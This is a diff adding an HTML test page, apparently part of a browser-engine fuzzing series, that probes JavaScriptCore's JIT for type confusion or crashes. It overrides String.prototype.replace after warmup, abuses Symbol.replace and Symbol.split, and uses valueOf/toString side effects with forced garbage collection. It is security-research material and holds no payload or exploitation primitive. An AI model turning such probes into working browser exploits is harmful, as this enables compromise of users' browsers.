@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>TEST 20 - String Method Side-Effects + JIT</title></head>
+<body>
+<h2>TEST 20 - String.prototype Side-Effects em JIT</h2>
+<p>Alvo: type confusion / crash em JSC via substituicao de metodos de String com callbacks
+que tem side-effects durante operacoes internas otimizadas</p>
+<p>API: String.prototype.replace, String.prototype.split, String.prototype.match,
+String.prototype[Symbol.replace], RegExp[Symbol.split]</p>
+<p>Tecnica: String.prototype.replace aceita funcao como substituto. Se o motor JIT inlinear
+o replace e assumir que o resultado e sempre string, substituir por algo que retorna
+um objeto pode causar type confusion no valor de retorno.</p>
+
+<pre id="log">Aguardando...</pre>
+<button onclick="testReplaceCallback()">REPLACE CALLBACK</button>
+<button onclick="testSymbolReplace()">SYMBOL.REPLACE OVERRIDE</button>
+<button onclick="testSplitAbuse()">SPLIT ABUSE</button>
+<button onclick="testStringCoerce()">STRING COERCE TRICK</button>
+
+<script>
+var log = document.getElementById('log');
+function append(msg) { log.textContent += '\n' + msg; }
+
+function forceGC() {
+  var t = []; for (var i = 0; i < 30000; i++) t.push({x:i}); t = null;
+}
+
+function testReplaceCallback() {
+  append('[20] String.replace com callback que retorna objeto em vez de string...');
+  try {
+    // Funcao que usa replace internamente - JIT vai inline
+    function processString(s) {
+      // JIT assume que replace retorna string
+      var result = s.replace(/(\d+)/g, function(match) {
+        return match * 2; // Ok - number coercido para string
+      });
+      return result.length; // JIT assume result.length e numero
+    }
+
+    // Warmup: resultado normal
+    var warmupStr = 'abc123def456ghi789';
+    for (var i = 0; i < 50000; i++) processString(warmupStr);
+    append('[20] Warmup processString OK');
+
+    // Agora trocar String.prototype.replace por versao maligna
+    var originalReplace = String.prototype.replace;
+
+    var callCount = 0;
+    String.prototype.replace = function(pattern, replacement) {
+      callCount++;
+      if (callCount > 50000 && callCount <= 50010) {
+        // Retornar objeto em vez de string
+        append('[20] replace() call #' + callCount + ': retornando objeto!');
+        return {
+          evil: true,
+          length: 0xDEAD,  // length errado
+          toString: function() { return '[evil object]'; }
+        };
+      }
+      return originalReplace.call(this, pattern, replacement);
+    };
+
+    // Chamar funcao JIT com o replace substituido
+    try {
+      var r = processString('test123');
+      append('[20] processString apos replace substituido: ' + r);
+      if (r === 0xDEAD) {
+        append('[20] *** OBJECT LENGTH LIDO COMO NUMBER: type confusion! ***');
+      }
+    } catch(e2) {
+      append('[20] processString EXCECAO apos substituicao: ' + e2.message);
+    } finally {
+      // Restaurar replace original
+      String.prototype.replace = originalReplace;
+      append('[20] String.prototype.replace restaurado');
+    }
+
+    append('[20] callCount total: ' + callCount);
+  } catch(e) {
+    append('[20] Replace callback EXCECAO: ' + e.message);
+  }
+}
+
+function testSymbolReplace() {
+  append('[20] Symbol.replace override em objeto passado como pattern...');
+  try {
+    // Qualquer objeto com [Symbol.replace] pode ser passado como pattern para String.replace
+    // O motor chama o Symbol.replace do objeto, que pode retornar qualquer coisa
+
+    var evilPattern = {
+      [Symbol.replace]: function(string, replacement) {
+        append('[20] Symbol.replace chamado! string=' + string.slice(0, 20));
+        forceGC();
+        // Retornar um objeto com valueOf que tem side-effect
+        return {
+          valueOf: function() {
+            append('[20] valueOf do resultado Symbol.replace chamado');
+            return 'replaced_by_symbol';
+          },
+          toString: function() {
+            return 'replaced_by_symbol';
+          },
+          length: 99999
+        };
+      }
+    };
+
+    var original = 'hello world test 123';
+    var result = original.replace(evilPattern, 'substituto');
+    append('[20] replace com Symbol.replace: result=' + result);
+    append('[20] result.length: ' + result.length);
+    append('[20] typeof result: ' + typeof result);
+
+    // Se result e o objeto com length=99999, JIT pode ler length errado
+    if (typeof result === 'object' && result.length === 99999) {
+      append('[20] *** RESULT E OBJETO: replace nao stringificou! ***');
+    }
+
+    // Testar com Symbol.replace que lanca excecao apos warmup
+    var callNum = 0;
+    var throwingPattern = {
+      [Symbol.replace]: function(string, repl) {
+        callNum++;
+        if (callNum > 5) {
+          // Depois de algumas chamadas normais, throw
+          throw new Error('Symbol.replace intencional');
+        }
+        return string.split(' ').reverse().join(' ');
+      }
+    };
+
+    var results2 = [];
+    for (var i = 0; i < 10; i++) {
+      try {
+        results2.push(original.replace(throwingPattern, ''));
+      } catch(e3) {
+        results2.push('ERR:' + e3.message);
+      }
+    }
+    append('[20] Results com throwingPattern: ' + results2.join(' | '));
+    append('[20] callNum: ' + callNum);
+
+  } catch(e) {
+    append('[20] Symbol.replace EXCECAO: ' + e.message);
+  }
+}
+
+function testSplitAbuse() {
+  append('[20] String.split abuse: limites e tipos inesperados...');
+  try {
+    var str = 'a,b,c,d,e,f,g,h,i,j';
+
+    // Split com limit negativo, zero, Infinity, NaN, objeto
+    var limits = [
+      { val: 0,         label: 'limit=0' },
+      { val: -1,        label: 'limit=-1' },
+      { val: Infinity,  label: 'limit=Infinity' },
+      { val: NaN,       label: 'limit=NaN' },
+      { val: 2.9,       label: 'limit=2.9 (float)' },
+      { val: -Infinity, label: 'limit=-Infinity' },
+      { val: {},        label: 'limit={}' },
+      { val: '3',       label: 'limit="3" (string)' },
+    ];
+
+    for (var i = 0; i < limits.length; i++) {
+      try {
+        var r = str.split(',', limits[i].val);
+        append('[20] split ' + limits[i].label + ': length=' + r.length + ' | ' + r.join('|'));
+      } catch(e2) {
+        append('[20] split ' + limits[i].label + ' EXCECAO: ' + e2.message);
+      }
+    }
+
+    // Separator com Symbol.split
+    var evilSeparator = {
+      [Symbol.split]: function(string, limit) {
+        append('[20] Symbol.split chamado | string len=' + string.length);
+        forceGC();
+        // Retornar algo inesperado
+        return {
+          0: 'injected',
+          1: 'result',
+          length: 2,
+          [Symbol.iterator]: Array.prototype[Symbol.iterator]
+        };
+      }
+    };
+
+    var r2 = str.split(evilSeparator);
+    append('[20] split com Symbol.split: ' + Array.from(r2).join(' | '));
+
+    // Regex com flags globais e split
+    var evilRegex = /,/g;
+    var splitResult = str.split(evilRegex);
+    append('[20] split(/,/g): ' + splitResult.join(' | ') + ' | len=' + splitResult.length);
+
+    // Split em string vazia com string vazia
+    var emptyStr = '';
+    var emptyResult = emptyStr.split('');
+    append('[20] "".split(""): length=' + emptyResult.length);
+
+    // Split que retorna mais elementos do que o esperado
+    var tricky = 'a' + '\u0000' + 'b' + '\u0000' + 'c';
+    var nullResult = tricky.split('\u0000');
+    append('[20] Split por null byte: length=' + nullResult.length + ' | parts: ' + nullResult.map(function(s) { return '"' + s + '"'; }).join(', '));
+
+  } catch(e) {
+    append('[20] Split abuse EXCECAO: ' + e.message);
+  }
+}
+
+function testStringCoerce() {
+  append('[20] String coerce tricks: objetos com valueOf/toString inesperados...');
+  try {
+    // Objeto que retorna tipo diferente a cada chamada de valueOf
+    var shapeshifter = {
+      calls: 0,
+      valueOf: function() {
+        this.calls++;
+        switch(this.calls % 4) {
+          case 0: return 1.337;
+          case 1: return "string_value";
+          case 2: return null;
+          case 3: return this; // Retorna a si mesmo - loop?
+        }
+      },
+      toString: function() { return 'shapeshifter_' + this.calls; }
+    };
+
+    // Usar shapeshifter em operacoes de string
+    var ops = [
+      function() { return 'prefix_' + shapeshifter; },
+      function() { return shapeshifter + '_suffix'; },
+      function() { return '' + shapeshifter + ''; },
+      function() { return String(shapeshifter); },
+      function() { return shapeshifter.toString(); },
+      function() { return JSON.stringify(shapeshifter); },
+    ];
+
+    for (var i = 0; i < ops.length; i++) {
+      try {
+        var r = ops[i]();
+        append('[20] op[' + i + ']: "' + r + '" (calls=' + shapeshifter.calls + ')');
+      } catch(e2) {
+        append('[20] op[' + i + '] EXCECAO: ' + e2.message);
+      }
+    }
+
+    // Template literal com objeto que tem side-effect no toString
+    var sideEffectStr = {
+      toString: function() {
+        forceGC();
+        this.toString = function() { return 'mutated'; }; // Auto-substituir
+        return 'original';
+      }
+    };
+
+    var t1 = `inicio ${sideEffectStr} meio ${sideEffectStr} fim`;
+    append('[20] Template literal 1: "' + t1 + '"');
+    var t2 = `outro ${sideEffectStr} template`;
+    append('[20] Template literal 2: "' + t2 + '"');
+
+  } catch(e) {
+    append('[20] String coerce EXCECAO: ' + e.message);
+  }
+}
+</script>
+</body>
+</html>
